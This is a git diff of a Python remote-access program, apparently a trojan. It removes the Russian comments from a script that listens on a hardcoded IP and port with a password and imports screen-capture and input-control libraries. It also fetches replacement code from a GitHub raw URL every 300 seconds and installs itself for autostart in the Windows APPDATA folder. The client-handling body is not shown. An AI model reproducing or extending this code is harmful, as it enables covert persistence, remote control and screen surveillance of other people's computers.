@@ -5,21 +5,18 @@ import os
 import struct
 import sys
 import time
-import requests  # pip install requests
+import requests 
 from io import BytesIO
 from PIL import ImageGrab
 import pyautogui
 
-# Настройки сервера
-HOST = '25.33.76.33'  # IP-адрес сервера
-PORT = 12536         # Порт
+HOST = '25.33.76.33' 
+PORT = 12536  
 PASSWORD = 'StrongPassword123'
 
-# URL для автообновления
 UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/main/server.py'
-CHECK_INTERVAL = 300  # Проверка каждые 300 секунд
+CHECK_INTERVAL = 300
 
-# --- Отправка/приём данных ---
 def send_data(conn, data: bytes):
     conn.sendall(struct.pack('>I', len(data)))
     conn.sendall(data)
@@ -37,7 +34,6 @@ def recv_data(conn) -> bytes:
         data += packet
     return data
 
-# --- Автообновление ---
 def auto_update():
     while True:
         try:
@@ -64,10 +60,9 @@ def auto_update():
             print(f'[!] Auto-update error: {e}')
         time.sleep(CHECK_INTERVAL)
 
-# --- Автозапуск ---
 def setup_autostart():
     if os.name != 'nt':
-        return  # Только Windows
+        return 
 
     appdata = os.environ.get('APPDATA')
     if not appdata:
@@ -87,7 +82,6 @@ def setup_autostart():
         except Exception as e:
             print(f'[!] Failed to create autostart: {e}')
 
-# --- Клиентский обработчик ---
 def handle_client(conn, addr):
     print(f'[+] Connected by {addr}')
     try:
@@ -163,7 +157,6 @@ def handle_client(conn, addr):
         conn.close()
         print(f'[-] Disconnected {addr}')
 
-# --- Запуск сервера ---
 def start_server():
     setup_autostart()
     threading.Thread(target=auto_update, daemon=True).start()
@@ -178,5 +171,6 @@ def start_server():
 
 if __name__ == '__main__':
     start_server()
+
 
 
